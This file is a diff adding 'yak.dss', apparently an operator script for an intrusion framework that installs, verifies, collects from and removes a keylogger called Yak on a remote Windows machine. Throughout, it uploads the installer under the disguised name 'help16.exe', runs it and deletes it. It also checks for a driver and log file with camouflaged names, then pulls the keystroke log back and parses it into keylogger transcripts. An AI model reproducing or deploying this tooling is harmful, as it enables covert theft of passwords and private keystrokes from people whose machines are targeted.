@@ -1,0 +1,304 @@
+#--------------------------------------------------------
+# File: yak.dss
+# 24Nov08 - updated to .dss
+#  --add reset to zero option
+# Script to install/uninstall/collect Yak
+#-------------------------------------------------------
+
+@include "_Versions.dsi";
+@include "_LpHelperFunctions.dsi";
+
+int $menuOption;
+string $resdir;
+_GetLpResourcesDirectory($resdir);
+
+string $YakUploadFile = "yak_min_install.exe";
+string $localInstallPath = "yak2\\yak_min_install.exe";
+string $localParsePath = 	"$resdir\\Ops\\Tools\\i386-winnt\\yak2\\yak.exe";
+string $fileName = 			"help16.exe";
+string $tool = "Yak";
+string $version = "2";
+
+# Make sure this is running on Windows
+string $OS;
+_GetOsFamily($OS);
+if ($OS != "winnt") {
+	echo "* * *";
+	echo "* * * YAK needs to be run on a Windows OS";
+	echo "* * *";
+	return false;
+	}
+
+# Try to get the system path, or else bail
+string $systemPath;
+if ( _GetSystemPath($systemPath)) {
+	echo "System Path: $systemPath";
+	}
+else {
+	echo "* * * Can not get system path";
+	return false;
+	}
+	
+
+$menuOption = 3;
+
+while ( $menuOption != 0) {
+	echo "";
+	echo "***************************";
+	echo "*       YAK$version  MENU        *";
+	echo "***************************";
+	# print the command list
+	echo "";
+	echo " (0). Exit";
+	echo " (1). Install";
+	echo " (2). Uninstall";
+	echo " (3). Verify Install";
+	echo " (4). Collect and Parse";
+	echo " (5). Clear Capture File";
+	echo "";
+	GetInput("Enter the desired option", $menuOption);
+
+	if ($menuOption == 0) {
+		echo "***************************";
+		echo "*  YAK script completed.  *";
+		echo "***************************";
+		return true;
+
+	} else if ($menuOption == 1) {
+		if(YakInstall($localInstallPath, $YakUploadFile, $systemPath, $fileName, "-is")) {
+			echo "== YAK Install Successful ==";
+			echo "";
+			echo "";
+			_RecordToolUse($tool,$version,"DEPLOYED","Successful");
+		}
+		else { echo "failure"; _RecordToolUse($tool,$version,"DEPLOYED","Unuccessful"); }
+	} else if ($menuOption == 2) {
+		if(YakInstall($localInstallPath, $YakUploadFile, $systemPath, $fileName, "-u")) { _RecordToolUse($tool,$version,"DELETED","Successful"); }
+		else { _RecordToolUse($tool,$version,"DELETED","Unsuccessful"); }
+	} else if ($menuOption == 3) {
+		if(YakVerify($systemPath)) { _RecordToolUse($tool,$version,"EXERCISED","Successful"); }
+		else { _RecordToolUse($tool,$version,"EXERCISED","Unsuccessful"); }
+	} else if ($menuOption == 4) {
+		if(YakCollect($systemPath, $localParsePath)){
+			echo "";
+			echo "== YAK Collection Successful ==";
+			echo "";
+			echo "";
+			_RecordToolUse($tool,$version,"EXERCISED","Successful");
+		}
+		else {
+			echo "Collection and parsing could not be completed, please finish manually";
+			_RecordToolUse($tool,$version,"EXERCISED","Unsuccessful");
+		}
+	} else if ($menuOption == 5){
+		if(YakInstall($localInstallPath, $YakUploadFile, $systemPath, $fileName, "-r")) { _RecordToolUse($tool,$version,"EXERCISED","Successful"); }
+		else { _RecordToolUse($tool,$version,"EXERCISED","Unuccessful"); }
+	} else {
+	#--------------------------------------------------------
+	# Invalid menuOption
+	#--------------------------------------------------------
+		echo "";
+		echo "== Invalid menuOption ==";
+	}
+}
+
+
+return false;
+
+
+
+
+
+#========= S U B R O U T I N E S =====================================
+
+Sub YakUsage()
+{
+	echo "Usage: yak [arg]";
+	echo "    Runs Yak Script to perform Yak install, uninstall, verification, or collect";
+	echo "";
+	echo "Arguments:";
+	echo "    [arg]";
+	echo "        (optional) performs a specific Yak task and returns.  ";
+	echo "                   (INSTALL|UNINSTALL|VERIFY|COLLECT|CLEAR)";
+	echo "";
+	return true;
+}
+
+Sub YakInstall(IN string $localInstallPath, IN string $YakUploadFile, IN string $systemPath, IN string $fileName, IN string $command)
+{
+	bool $success = true;
+	#--------------------------------------------------------
+	# Install Yak - upload and run with -is option
+	#--------------------------------------------------------
+	echo "Uploading $YakUploadFile to $systemPath\\$fileName";
+	if ( `put $localInstallPath -project Ops -name "$systemPath\\$fileName"` ) {
+		echo "Running $fileName on target...\n";
+		@echo on;
+		if (`run -command "$systemPath\\$fileName $command" -redirect`)	{
+			echo "run $systemPath\\$fileName $command -redirect     - worked";
+		}
+		else{
+			@echo off;
+			echo "Could not run $systemPath\\$fileName $command";	
+			$success = false;
+		}
+		
+	}else{
+	echo "Could not put $fileName into $systemPath";
+		$success = false;
+		echo "";
+	}
+	@echo off;
+	echo "";
+	echo "Deleting $systemPath\\$fileName";
+	if ( `delete -file $systemPath\\$fileName`){
+		$success = true;
+	}
+	else {
+		echo "Could not delete $systemPath\\$fileName";
+		echo "Please delete it manually";
+		$success = false;
+		}
+	return $success;
+}
+
+
+
+
+Sub YakVerify(IN string $systemPath)
+{
+	#--------------------------------------------------------
+	# Check to see if yak files exist
+	#--------------------------------------------------------
+	bool $logSuccessFlag = true;
+	bool $driverSuccessFlag = true;
+	bool $success = true;
+	if (_FileExists ("vbnarm.dll", "$systemPath")) {
+	echo "vbnarm.dll log file exists ... SUCCESSFUL";
+	} else {
+		echo "vbnarm.dll log file missing ... FAILED";
+		$logSuccessFlag = false;
+
+	echo "";		}
+	if (_FileExists ("fsprtx.sys", "$systemPath\\drivers")) {
+		echo "fsprtx.sys driver exists ... SUCCESSFUL";
+	} else {
+		echo "fsprtx.sys driver missing ... FAILED";
+		$driverSuccessFlag = false;
+	}
+
+	if (($logSuccessFlag == true) && ($driverSuccessFlag == true)) {
+		echo "YAK properlly installed on target";	
+	} else if ((($logSuccessFlag == true) && ($driverSuccessFlag == false)) || 
+		   (($logSuccessFlag == false) && ($driverSuccessFlag == true))) {
+		echo "YAK is in a bad state...need a reboot before it's functional";
+		$success = false;
+	} else {
+		echo "YAK doesn't exist on target!";
+		$success = false;
+	}
+	return $success;
+}
+
+Sub YakCollect(IN string $systemPath, IN string $localParsePath)
+{
+	bool $success = true;
+	#--------------------------------------------------------
+	# Download Yak and Parse the local file
+	#--------------------------------------------------------
+	echo "Getting $systemPath\\vbnarm.dll...";
+	echo "";
+	@record on;
+	if (`copyget "$systemPath\\vbnarm.dll"`){
+	
+	}
+	else {
+		echo "Could not copyget $systemPath\\vbnarm.dll";
+		@record off;
+		return false;
+	}
+		
+	@record off;
+	bool $worked;
+	string $localName;
+	
+	$worked = GetCmdData("FileStart::LocalName", $localName);
+	string $temp;
+	regexsplit("_", $localName, 0, $temp);
+	int $counter = 1;
+	string $fileDate = "";
+	while ($counter < sizeOf($temp)) {
+		$fileDate = "$fileDate\_$temp[$counter]";
+	
+		$counter++;
+	}
+	
+	string $logdir;
+	 _GetLpLogsDirectory($logdir);
+
+	echo "";
+	echo "Moving file to NOSEND directory...";
+	`local mkdir $logdir\\GetFiles\\NOSEND`;
+	
+	if (`local move $logdir\\GetFiles\\$localName $logdir\\GetFiles\\NOSEND\\$localName`){
+		
+		}
+	else {
+		echo "Could not move GetFiles\\$localName into GetFiles\\NOSEND\\$localName";
+		return false;
+	}
+	echo "";
+	echo "Parsing file...";
+		
+	if (`local run -command "$localParsePath -tu -i $logdir\\GetFiles\\NOSEND\\$localName -o $logdir\\GetFiles\\keylogger$fileDate.txt"`){
+		echo "";
+	}
+	else {
+		echo "Could not run $localParsePath -tu -i";
+		$success = false;
+	}
+	
+	if (`local run -command "$localParsePath -tau -i $logdir\\GetFiles\\NOSEND\\$localName -o $logdir\\GetFiles\\keylogger_scancodes$fileDate.txt"`){
+		echo "";
+	}
+	else {
+		echo "Could not run $localParsePath -tau -i";
+		$success = false;
+	}
+	
+	echo "";
+	echo "Would you like to parse the file forcing English as a scancode option (Useful for boxes where multiple languages are used)?";
+	if ( prompt "Parse file forcing English as a scancode option?", true ) {
+		echo "";
+		echo "Parsing file w/ English...";
+		
+		if (`local run -command "$localParsePath -tu -i $logdir\\GetFiles\\NOSEND\\$localName -o $logdir\\GetFiles\\keylogger_EN_$fileDate.txt -l enus"`){
+			echo "";
+			}
+		else {
+			echo "Could not run $localParsePath -tu -i -l enus";
+			$success = false;
+		}
+		if (`local run -command "$localParsePath -tau -i $logdir\\GetFiles\\NOSEND\\$localName -o $logdir\\GetFiles\\keylogger_scancodes_EN_$fileDate.txt -l enus"`){
+			echo "Local parse 2 worked";
+			}
+		else {
+			echo "Could not run $localParsePath -tau -i -l enus";
+			$success = false;
+			}
+		
+	}
+	echo "";
+	@echo on;
+	`local dir -mask *$fileDate* -path "$logdir\\GetFiles\\NOSEND"`;
+	@echo off;
+	return $success;
+}	
+	
+	
+
+return true;
+
+
+
+
